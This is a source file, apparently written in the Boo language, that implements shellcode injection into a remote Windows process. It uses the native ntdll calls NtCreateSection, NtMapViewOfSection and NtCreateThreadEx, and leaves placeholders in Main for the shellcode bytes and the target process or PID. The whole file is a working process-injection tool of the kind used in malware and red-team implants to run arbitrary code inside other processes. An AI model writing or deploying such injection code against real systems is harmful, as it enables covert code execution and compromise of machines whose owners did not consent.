import System
import System.Runtime.InteropServices
import System.Diagnostics

[DllImport('ntdll.dll', SetLastError: true)]
public static def NtMapViewOfSection(SectionHandle as IntPtr, ProcessHandle as IntPtr, ref BaseAddress as IntPtr, ZeroBits as IntPtr, CommitSize as IntPtr, SectionOffset as IntPtr, ref ViewSize as uint, InheritDisposition as uint, AllocationType as uint, Win32Protect as uint) as IntPtr:
    pass

[DllImport('ntdll.dll', SetLastError: true)]
public static def NtUnmapViewOfSection(hProc as IntPtr, baseAddr as IntPtr) as IntPtr:
    pass

[DllImport('ntdll.dll', SetLastError: true)]
public static def NtCreateSection(ref SectionHandle as IntPtr, DesiredAccess as uint, ObjectAttributes as IntPtr, ref MaximumSize as ulong, SectionPageProtection as uint, AllocationAttributes as uint, FileHandle as IntPtr) as IntPtr:
    pass

[DllImport('ntdll.dll')]
static def NtCreateThreadEx(ref threadHandle as IntPtr, desiredAccess as AccessMask, objectAttributes as IntPtr, processHandle as IntPtr, startAddress as IntPtr, parameter as IntPtr, creationFlags as bool, stackZeroBits as int, sizeOfStack as int, maximumStackSize as int, attributeList as IntPtr) as IntPtr:
    pass

#Access Mask for NtCreateThreadEx
public enum AccessMask:
    SpecificRightsAll = 0x0FFFF
    StandardRightsAll = 0x01F0000

#Used to hold details about a Section
public struct SectionDetails:

    public baseAddr as IntPtr
    public size as uint

    public def constructor(addr as IntPtr, sizeData as uint):
        baseAddr = addr
        size = sizeData

# Wrapper function for NtCreateSection
public static def CreateSection(size as ulong, protection as uint) as IntPtr:
    ntstatus = IntPtr()
    SectionHandle = IntPtr()

    SECTION_ALL_ACCESS as uint = 0x10000000
    SEC_COMMIT as uint = 0x08000000

    ntstatus = NtCreateSection(SectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, size, protection, SEC_COMMIT, IntPtr.Zero)

    if ntstatus == IntPtr.Zero:
        print "Section created"
    else:
        print "Error when creating section. NTSTATUS: " + ntstatus

    return SectionHandle

# Wrapper function for NtMapViewOfSection
public static def MapSection(targetProcess as Process, sectionHandle as IntPtr, protection as uint, addr as IntPtr, sizeData as uint) as SectionDetails:
    ntstatus = IntPtr()
    baseAddr as IntPtr = addr
    size as uint = sizeData
    disp as uint = 2
    alloc as uint = 0

    #Memory Permissions
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20

    ntstatus = NtMapViewOfSection(sectionHandle, targetProcess.Handle, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, size, disp, alloc, protection)

    if ntstatus == IntPtr.Zero:
        print "Section mapped in process " + targetProcess.Id

        if protection == PAGE_EXECUTE_READWRITE:
            print "Section mapped as RWX"
        elif protection == PAGE_READWRITE:
            print "Section mapped as RW"
        elif protection == PAGE_EXECUTE_READ:
            print "Section mapped as RX"

    else:
        print "Error when mapping section. NTSTATUS: " + ntstatus

    details = SectionDetails(baseAddr, size)

    return details

# Wrapper function for NtUnmapViewOfSection
public static def UnmapSection(targetProcess as Process, baseAddr as IntPtr) as IntPtr:
    ntstatus = IntPtr()
    ntstatus = NtUnmapViewOfSection(targetProcess.Handle, baseAddr)

    if ntstatus == IntPtr.Zero:
        print "Unmapped section in process " + targetProcess.Id
    else:
        print "Error when unmapping section. NTSTATUS: " + ntstatus

    return ntstatus

# Wrapper function for NtCreateThreadEx
public static def CreateThread(targetProcess as Process, startAddress as IntPtr, suspended as bool) as IntPtr:
    ntstatus = IntPtr()
    threadHandle = IntPtr()

    ntstatus = NtCreateThreadEx(threadHandle, AccessMask.SpecificRightsAll | AccessMask.StandardRightsAll, 
        IntPtr.Zero, targetProcess.Handle, startAddress, IntPtr.Zero, suspended, 0, 0, 0, IntPtr.Zero)

    if ntstatus == IntPtr.Zero:
        print "Thread created in process " + targetProcess.Id + " via NtCreateThreadEx"
    else:
        print "Error when creating thread. NTSTATUS: " + ntstatus

    return threadHandle

public static def InjectRemote(sc as (byte), process as string, pid as int):
    # Memory Permissions
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20

    usepid as bool = false

    if pid != 0:
        usepid = true

    targetProcess as Process

    if usepid == true:
        targetProcess = Process.GetProcessById(pid)
    else:
        targetProcess = Process.GetProcessesByName(process)[0]

    procHandle = targetProcess.Handle
    print "Target Process Name = " + targetProcess.ProcessName
    print "Target Process ID = " +  targetProcess.Id

    #Used to hold NTSTATUS codes
    ntstatus = IntPtr()

    #Create a new section
    #NtCreateSection
    sectionHandle = IntPtr()
    maxSize as ulong = sc.Length

    sectionHandle = CreateSection(maxSize, PAGE_EXECUTE_READWRITE)

    #Map a view of the section to the current process so that we can write to it
    details as SectionDetails
    size as uint = sc.Length

    details = MapSection(Process.GetCurrentProcess(), sectionHandle, PAGE_READWRITE, IntPtr.Zero, size)

    #Copy shellcode to locally mapped view
    Marshal.Copy(sc, 0, details.baseAddr, maxSize)

    print "Wrote shellcode to locally mapped view of section"

    #Unmap section from current process
    UnmapSection(Process.GetCurrentProcess(), details.baseAddr)

    #Map a view of the section to the target process
    details = MapSection(targetProcess, sectionHandle, PAGE_EXECUTE_READ, IntPtr.Zero, size)

    #Create a remote thread with NtCreateThreadEx
    threadHandle = IntPtr()
    threadHandle = CreateThread(targetProcess, details.baseAddr, false)

    if threadHandle == IntPtr.Zero:
        print "Injection failed!"
    else:
        print "Injected!"

public static def Main():
    shellcode = array(byte, (BYTES))
    InjectRemote(shellcode, "PROCESS", PID)
